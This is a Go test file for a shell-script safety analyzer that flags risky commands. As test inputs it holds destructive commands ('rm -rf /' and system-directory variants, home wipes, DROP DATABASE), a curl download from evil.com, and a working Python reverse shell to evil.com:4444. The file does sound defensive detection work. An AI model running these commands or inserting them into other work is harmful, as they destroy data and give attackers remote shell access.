package analyzer

import (
	"testing"

	"github.com/vectra-guard/vectra-guard/internal/config"
)

func TestAnalyzeScriptDetectsCriticals(t *testing.T) {
	script := []byte("#!/usr/bin/env bash\nrm -rf /\n")
	findings := AnalyzeScript("danger.sh", script, config.PolicyConfig{})
	if len(findings) == 0 {
		t.Fatalf("expected findings, got none")
	}
}

func TestAllowlistSkipsLine(t *testing.T) {
	script := []byte("sudo echo allowed\n")
	policy := config.PolicyConfig{Allowlist: []string{"sudo echo"}}
	findings := AnalyzeScript("safe.sh", script, policy)
	for _, f := range findings {
		if f.Code == "SUDO_USAGE" {
			t.Fatalf("expected sudo usage to be skipped by allowlist")
		}
	}
}

func TestNonStandardExtensionAddsFinding(t *testing.T) {
	script := []byte("echo ok\n")
	findings := AnalyzeScript("script.txt", script, config.PolicyConfig{})
	hasExtensionFinding := false
	for _, f := range findings {
		if f.Code == "NON_STANDARD_EXTENSION" {
			hasExtensionFinding = true
			break
		}
	}
	if !hasExtensionFinding {
		t.Fatalf("expected extension finding for non .sh file")
	}
}

func TestGitForcePushDetection(t *testing.T) {
	tests := []struct {
		name     string
		script   string
		shouldFind bool
	}{
		{"force push long", "git push --force origin main", true},
		{"force push short", "git push -f origin main", true},
		{"normal push", "git push origin main", false},
		{"hard reset", "git reset --hard HEAD~1", true},
	}
	
	policy := config.PolicyConfig{MonitorGitOps: true, BlockForceGit: true}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := AnalyzeScript("test.sh", []byte(tt.script), policy)
			found := false
			for _, f := range findings {
				if f.Code == "RISKY_GIT_OPERATION" {
					found = true
					break
				}
			}
			if found != tt.shouldFind {
				t.Errorf("expected finding=%v, got=%v for script: %s", tt.shouldFind, found, tt.script)
			}
		})
	}
}

func TestDestructiveSQLDetection(t *testing.T) {
	tests := []struct {
		name          string
		script        string
		shouldFind    bool
		onlyDestructive bool
	}{
		{"drop table", "mysql -e 'DROP TABLE users'", true, true},
		{"select query", "mysql -e 'SELECT * FROM users'", false, true},
		{"delete query", "psql -c 'DELETE FROM users WHERE id=1'", true, true},
		{"select with flag off", "mysql -e 'SELECT * FROM users'", true, false},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			policy := config.PolicyConfig{OnlyDestructiveSQL: tt.onlyDestructive}
			findings := AnalyzeScript("test.sh", []byte(tt.script), policy)
			found := false
			for _, f := range findings {
				if f.Code == "DATABASE_OPERATION" {
					found = true
					break
				}
			}
			if found != tt.shouldFind {
				t.Errorf("expected finding=%v, got=%v for script: %s", tt.shouldFind, found, tt.script)
			}
		})
	}
}

func TestProductionEnvironmentDetection(t *testing.T) {
	tests := []struct {
		name       string
		script     string
		shouldFind bool
	}{
		{"prod in url", "curl https://api.prod.example.com/deploy", true},
		{"production export", "export ENV=production", true},
		{"staging config", "kubectl apply -f staging-config.yaml", true},
		{"dev environment", "export ENV=development", false},
		{"prod in comment", "# this is for prod later", false},
	}
	
	policy := config.PolicyConfig{
		DetectProdEnv:   true,
		ProdEnvPatterns: []string{"prod", "production", "staging", "stg"},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := AnalyzeScript("test.sh", []byte(tt.script), policy)
			found := false
			for _, f := range findings {
				if f.Code == "PRODUCTION_ENVIRONMENT" {
					found = true
					break
				}
			}
			if found != tt.shouldFind {
				t.Errorf("expected finding=%v, got=%v for script: %s", tt.shouldFind, found, tt.script)
			}
		})
	}
}

func TestGitProdCombination(t *testing.T) {
	script := "git push --force origin production"
	policy := config.PolicyConfig{
		MonitorGitOps:   true,
		BlockForceGit:   true,
		DetectProdEnv:   true,
		ProdEnvPatterns: []string{"production", "prod"},
	}
	
	findings := AnalyzeScript("test.sh", []byte(script), policy)
	
	// Should have findings
	if len(findings) == 0 {
		t.Fatal("expected findings for force push to production")
	}
	
	// Should be critical severity
	foundCritical := false
	for _, f := range findings {
		if f.Code == "RISKY_GIT_OPERATION" && f.Severity == "critical" {
			foundCritical = true
			break
		}
	}
	
	if !foundCritical {
		t.Error("expected critical severity for force push to production")
	}
}

func TestDestructiveSQLInProduction(t *testing.T) {
	script := "mysql -h prod-db.example.com -e 'DROP DATABASE users'"
	policy := config.PolicyConfig{
		OnlyDestructiveSQL: true,
		DetectProdEnv:      true,
		ProdEnvPatterns:    []string{"prod"},
	}
	
	findings := AnalyzeScript("test.sh", []byte(script), policy)
	
	foundCritical := false
	for _, f := range findings {
		if f.Code == "DATABASE_OPERATION" && f.Severity == "critical" {
			foundCritical = true
			break
		}
	}
	
	if !foundCritical {
		t.Error("expected critical severity for destructive SQL in production")
	}
}

func TestNetworkScriptDownloadDetection(t *testing.T) {
	script := "curl http://evil.com/script.sh"
	policy := config.PolicyConfig{}

	findings := AnalyzeScript("test.sh", []byte(script), policy)

	found := false
	for _, f := range findings {
		if f.Code == "NETWORK_SCRIPT_DOWNLOAD" {
			found = true
			break
		}
	}

	if !found {
		t.Error("expected network script download to be detected")
	}
}

func TestReverseShellDetection(t *testing.T) {
	script := "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
	policy := config.PolicyConfig{}

	findings := AnalyzeScript("test.sh", []byte(script), policy)

	found := false
	for _, f := range findings {
		if f.Code == "REVERSE_SHELL" && f.Severity == "critical" {
			found = true
			break
		}
	}

	if !found {
		t.Error("expected reverse shell pattern to be detected as critical")
	}
}

func TestMongoDropDatabaseDetection(t *testing.T) {
	script := "mongo production --eval 'db.dropDatabase()'"
	policy := config.PolicyConfig{OnlyDestructiveSQL: true}

	findings := AnalyzeScript("test.sh", []byte(script), policy)

	found := false
	for _, f := range findings {
		if f.Code == "DATABASE_OPERATION" {
			found = true
			break
		}
	}

	if !found {
		t.Error("expected mongo dropDatabase to be detected as destructive")
	}
}

func TestGitOperationsDisabledByConfig(t *testing.T) {
	script := "git push --force origin main"
	policy := config.PolicyConfig{
		MonitorGitOps: false, // Disabled
	}
	
	findings := AnalyzeScript("test.sh", []byte(script), policy)
	
	for _, f := range findings {
		if f.Code == "RISKY_GIT_OPERATION" {
			t.Error("git operations should not be monitored when disabled")
		}
	}
}

func TestProdDetectionDisabledByConfig(t *testing.T) {
	script := "curl https://api.prod.example.com/deploy"
	policy := config.PolicyConfig{
		DetectProdEnv: false, // Disabled
	}
	
	findings := AnalyzeScript("test.sh", []byte(script), policy)
	
	for _, f := range findings {
		if f.Code == "PRODUCTION_ENVIRONMENT" {
			t.Error("production detection should not trigger when disabled")
		}
	}
}

func TestMultipleSQLOperations(t *testing.T) {
	tests := []struct {
		name       string
		script     string
		shouldFind bool
		severity   string
	}{
		{"UPDATE", "mysql -e 'UPDATE users SET active=0'", true, "high"},
		{"INSERT", "psql -c 'INSERT INTO logs VALUES (1, 2)'", false, ""}, // INSERT is not always destructive
		{"ALTER TABLE", "mysql -e 'ALTER TABLE users ADD COLUMN'", true, "high"},
		{"GRANT", "psql -c 'GRANT ALL ON database TO user'", true, "high"},
		{"REVOKE", "mysql -e 'REVOKE ALL FROM user'", true, "high"},
	}
	
	policy := config.PolicyConfig{OnlyDestructiveSQL: true}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := AnalyzeScript("test.sh", []byte(tt.script), policy)
			found := false
			for _, f := range findings {
				if f.Code == "DATABASE_OPERATION" {
					found = true
					if tt.severity != "" && f.Severity != tt.severity {
						t.Errorf("expected severity %s, got %s", tt.severity, f.Severity)
					}
				}
			}
			if found != tt.shouldFind {
				t.Errorf("expected finding=%v, got=%v", tt.shouldFind, found)
			}
		})
	}
}

func TestGitOperationsSeverityEscalation(t *testing.T) {
	tests := []struct {
		name           string
		script         string
		baseSeverity   string
		prodSeverity   string
	}{
		{
			name:         "force push - high to critical with BlockForceGit",
			script:       "git push -f origin",
			baseSeverity: "critical", // BlockForceGit=true makes it critical even without prod
			prodSeverity: "critical",
		},
		{
			name:         "hard reset - medium stays high",
			script:       "git reset --hard",
			baseSeverity: "medium",
			prodSeverity: "high",
		},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Test without production
			policy := config.PolicyConfig{
				MonitorGitOps: true,
				BlockForceGit: true,
				DetectProdEnv: false,
			}
			
			findings := AnalyzeScript("test.sh", []byte(tt.script), policy)
			if len(findings) > 0 {
				baseSev := findings[0].Severity
				if baseSev != tt.baseSeverity {
					t.Errorf("base severity: expected %s, got %s", tt.baseSeverity, baseSev)
				}
			}
			
			// Test with production
			policyProd := config.PolicyConfig{
				MonitorGitOps:   true,
				BlockForceGit:   true,
				DetectProdEnv:   true,
				ProdEnvPatterns: []string{"prod"},
			}
			
			scriptProd := tt.script + " production"
			findingsProd := AnalyzeScript("test.sh", []byte(scriptProd), policyProd)
			
			foundCorrectSeverity := false
			for _, f := range findingsProd {
				if f.Code == "RISKY_GIT_OPERATION" && f.Severity == tt.prodSeverity {
					foundCorrectSeverity = true
					break
				}
			}
			
			if !foundCorrectSeverity {
				t.Errorf("production severity: expected %s", tt.prodSeverity)
			}
		})
	}
}

func TestComplexScriptWithMultipleFindings(t *testing.T) {
	script := `#!/bin/bash
# Deploy script
export ENV=production
git push --force origin production
mysql -h prod-db.example.com -e "DROP TABLE cache"
rm -rf /tmp/old_data
`
	
	policy := config.PolicyConfig{
		MonitorGitOps:      true,
		BlockForceGit:      true,
		DetectProdEnv:      true,
		ProdEnvPatterns:    []string{"prod", "production"},
		OnlyDestructiveSQL: true,
	}
	
	findings := AnalyzeScript("deploy.sh", []byte(script), policy)
	
	// Should find multiple issues
	if len(findings) < 3 {
		t.Errorf("expected at least 3 findings, got %d", len(findings))
	}
	
	// Check for expected codes
	codes := make(map[string]bool)
	for _, f := range findings {
		codes[f.Code] = true
	}
	
	expectedCodes := []string{"PRODUCTION_ENVIRONMENT", "RISKY_GIT_OPERATION", "DATABASE_OPERATION"}
	for _, code := range expectedCodes {
		if !codes[code] {
			t.Errorf("expected to find code %s", code)
		}
	}
	
	// At least one should be critical
	hasCritical := false
	for _, f := range findings {
		if f.Severity == "critical" {
			hasCritical = true
			break
		}
	}
	if !hasCritical {
		t.Error("expected at least one critical finding")
	}
}

func TestCustomProdPatterns(t *testing.T) {
	script := "kubectl apply -f uat-deployment.yaml"
	
	policy := config.PolicyConfig{
		DetectProdEnv:   true,
		ProdEnvPatterns: []string{"uat", "preprod"}, // Custom patterns
	}
	
	findings := AnalyzeScript("test.sh", []byte(script), policy)
	
	found := false
	for _, f := range findings {
		if f.Code == "PRODUCTION_ENVIRONMENT" && f.Description == "Production or staging environment detected: UAT" {
			found = true
			break
		}
	}
	
	if !found {
		t.Error("custom production pattern 'uat' should be detected")
	}
}

func TestNoFalsePositivesForSafeOperations(t *testing.T) {
	safeScripts := []string{
		"git status",
		"git log",
		"git diff",
		"mysql -e 'SELECT * FROM users'",
		"psql -c 'SHOW TABLES'",
		"npm install",
		"npm test",
		// Note: "echo 'production' > config.txt" will trigger prod detection
		// because it has both "production" and redirection operator ">"
		// This is intentional - writing to config files with prod in the command is suspicious
		"cat production.log",  // Just reading a file - should be safe
		"ls /var/log/production", // Just listing files - should be safe
	}
	
	policy := config.PolicyConfig{
		MonitorGitOps:      true,
		DetectProdEnv:      true,
		OnlyDestructiveSQL: true,
		ProdEnvPatterns:    []string{"prod", "production"},
	}
	
	for _, script := range safeScripts {
		t.Run(script, func(t *testing.T) {
			findings := AnalyzeScript("test.sh", []byte(script), policy)
			
			// Should have no high or critical findings for safe operations
			for _, f := range findings {
				if f.Severity == "high" || f.Severity == "critical" {
					t.Errorf("safe script triggered high/critical finding: %s - %s", 
						f.Code, f.Description)
				}
			}
		})
	}
}

func TestProdDetectionEdgeCases(t *testing.T) {
	// Test cases where "production" appears but should/shouldn't trigger
	tests := []struct {
		name       string
		script     string
		shouldFlag bool
		reason     string
	}{
		{
			name:       "echo to config file",
			script:     "echo 'production' > config.txt",
			shouldFlag: true, // Has prod + config context
			reason:     "writing production to config file is suspicious",
		},
		{
			name:       "just reading log file",
			script:     "cat production.log",
			shouldFlag: false, // Just reading, no context indicators
			reason:     "reading production log file is safe",
		},
		{
			name:       "production in comment only",
			script:     "# Deploy to production later",
			shouldFlag: false,
			reason:     "comments should be ignored",
		},
		{
			name:       "export production env",
			script:     "export NODE_ENV=production",
			shouldFlag: true,
			reason:     "setting production environment variable",
		},
	}
	
	policy := config.PolicyConfig{
		DetectProdEnv:   true,
		ProdEnvPatterns: []string{"production"},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := AnalyzeScript("test.sh", []byte(tt.script), policy)
			
			foundProdWarning := false
			for _, f := range findings {
				if f.Code == "PRODUCTION_ENVIRONMENT" {
					foundProdWarning = true
					break
				}
			}
			
			if foundProdWarning != tt.shouldFlag {
				t.Errorf("%s: expected flag=%v (reason: %s), got flag=%v",
					tt.name, tt.shouldFlag, tt.reason, foundProdWarning)
			}
		})
	}
}

func TestEdgeCases(t *testing.T) {
	tests := []struct {
		name   string
		script string
		policy config.PolicyConfig
	}{
		{
			name:   "empty script",
			script: "",
			policy: config.PolicyConfig{},
		},
		{
			name:   "only comments",
			script: "# This is a comment\n# Another comment",
			policy: config.PolicyConfig{},
		},
		{
			name:   "whitespace only",
			script: "   \n\t\n   ",
			policy: config.PolicyConfig{},
		},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Should not panic
			findings := AnalyzeScript("test.sh", []byte(tt.script), tt.policy)
			// Empty/whitespace scripts should have minimal findings
			t.Logf("Found %d findings for %s", len(findings), tt.name)
		})
	}
}

// TestEnhancedDestructiveCommandDetection tests the improved pattern detection
// that catches all variations of destructive rm commands (the incident scenario)
func TestEnhancedDestructiveCommandDetection(t *testing.T) {
	tests := []struct {
		name           string
		script         string
		shouldDetect   bool
		expectedCode   string
		expectedSeverity string
	}{
		// Original pattern (already tested, but included for completeness)
		{
			name:           "rm -rf / (original)",
			script:         "rm -rf /",
			shouldDetect:   true,
			expectedCode:   "DANGEROUS_DELETE_ROOT",
			expectedSeverity: "critical",
		},
		// The incident scenario - this is what we're fixing
		{
			name:           "rm -r /* (incident scenario)",
			script:         "rm -r /*",
			shouldDetect:   true,
			expectedCode:   "DANGEROUS_DELETE_ROOT",
			expectedSeverity: "critical",
		},
		{
			name:           "rm -rf /* (with wildcard)",
			script:         "rm -rf /*",
			shouldDetect:   true,
			expectedCode:   "DANGEROUS_DELETE_ROOT",
			expectedSeverity: "critical",
		},
		{
			name:           "rm -r / (without force)",
			script:         "rm -r /",
			shouldDetect:   true,
			expectedCode:   "DANGEROUS_DELETE_ROOT",
			expectedSeverity: "critical",
		},
		{
			name:           "rm -rf / (with trailing space)",
			script:         "rm -rf / ",
			shouldDetect:   true,
			expectedCode:   "DANGEROUS_DELETE_ROOT",
			expectedSeverity: "critical",
		},
		{
			name:           "rm -r / * (space between)",
			script:         "rm -r / *",
			shouldDetect:   true,
			expectedCode:   "DANGEROUS_DELETE_ROOT",
			expectedSeverity: "critical",
		},
		// System directory targets
		{
			name:           "rm -rf /bin",
			script:         "rm -rf /bin",
			shouldDetect:   true,
			expectedCode:   "DANGEROUS_DELETE_ROOT",
			expectedSeverity: "critical",
		},
		{
			name:           "rm -rf /usr",
			script:         "rm -rf /usr",
			shouldDetect:   true,
			expectedCode:   "DANGEROUS_DELETE_ROOT",
			expectedSeverity: "critical",
		},
		{
			name:           "rm -rf /etc",
			script:         "rm -rf /etc",
			shouldDetect:   true,
			expectedCode:   "DANGEROUS_DELETE_ROOT",
			expectedSeverity: "critical",
		},
		{
			name:           "rm -rf /var",
			script:         "rm -rf /var",
			shouldDetect:   true,
			expectedCode:   "DANGEROUS_DELETE_ROOT",
			expectedSeverity: "critical",
		},
		{
			name:           "rm -rf /opt",
			script:         "rm -rf /opt",
			shouldDetect:   true,
			expectedCode:   "DANGEROUS_DELETE_ROOT",
			expectedSeverity: "critical",
		},
		{
			name:           "rm -rf /sbin",
			script:         "rm -rf /sbin",
			shouldDetect:   true,
			expectedCode:   "DANGEROUS_DELETE_ROOT",
			expectedSeverity: "critical",
		},
		{
			name:           "rm -rf /lib",
			script:         "rm -rf /lib",
			shouldDetect:   true,
			expectedCode:   "DANGEROUS_DELETE_ROOT",
			expectedSeverity: "critical",
		},
		{
			name:           "rm -rf /root",
			script:         "rm -rf /root",
			shouldDetect:   true,
			expectedCode:   "DANGEROUS_DELETE_ROOT",
			expectedSeverity: "critical",
		},
		// Safe operations (should not trigger)
		{
			name:           "rm -rf ./tmp (safe - relative path)",
			script:         "rm -rf ./tmp",
			shouldDetect:   false,
			expectedCode:   "",
			expectedSeverity: "",
		},
		{
			name:           "rm -rf /tmp/test (safe - specific subdirectory)",
			script:         "rm -rf /tmp/test",
			shouldDetect:   false,
			expectedCode:   "",
			expectedSeverity: "",
		},
		{
			name:           "rm file.txt (safe - single file)",
			script:         "rm file.txt",
			shouldDetect:   false,
			expectedCode:   "",
			expectedSeverity: "",
		},
	}
	
	policy := config.PolicyConfig{}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := AnalyzeScript("test.sh", []byte(tt.script), policy)
			
			found := false
			for _, f := range findings {
				if f.Code == tt.expectedCode {
					found = true
					if f.Severity != tt.expectedSeverity {
						t.Errorf("expected severity %s, got %s", tt.expectedSeverity, f.Severity)
					}
					break
				}
			}
			
			if found != tt.shouldDetect {
				t.Errorf("expected detection=%v, got=%v for script: %s", 
					tt.shouldDetect, found, tt.script)
			}
		})
	}
}

// TestHomeDirectoryDeletionDetection tests detection of dangerous home directory operations
func TestHomeDirectoryDeletionDetection(t *testing.T) {
	tests := []struct {
		name           string
		script         string
		shouldDetect   bool
		expectedCode   string
	}{
		{
			name:           "rm -rf ~/* (home wildcard)",
			script:         "rm -rf ~/*",
			shouldDetect:   true,
			expectedCode:   "DANGEROUS_DELETE_HOME",
		},
		{
			name:           "rm -r ~/* (home wildcard without force)",
			script:         "rm -r ~/*",
			shouldDetect:   true,
			expectedCode:   "DANGEROUS_DELETE_HOME",
		},
		{
			name:           "rm -rf $HOME/* (home env var)",
			script:         "rm -rf $HOME/*",
			shouldDetect:   true,
			expectedCode:   "DANGEROUS_DELETE_HOME",
		},
		{
			name:           "rm -rf ~/specific_dir (safe - specific directory)",
			script:         "rm -rf ~/specific_dir",
			shouldDetect:   false,
			expectedCode:   "",
		},
	}
	
	policy := config.PolicyConfig{}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := AnalyzeScript("test.sh", []byte(tt.script), policy)
			
			found := false
			for _, f := range findings {
				if f.Code == tt.expectedCode {
					found = true
					break
				}
			}
			
			if found != tt.shouldDetect {
				t.Errorf("expected detection=%v, got=%v for script: %s", 
					tt.shouldDetect, found, tt.script)
			}
		})
	}
}
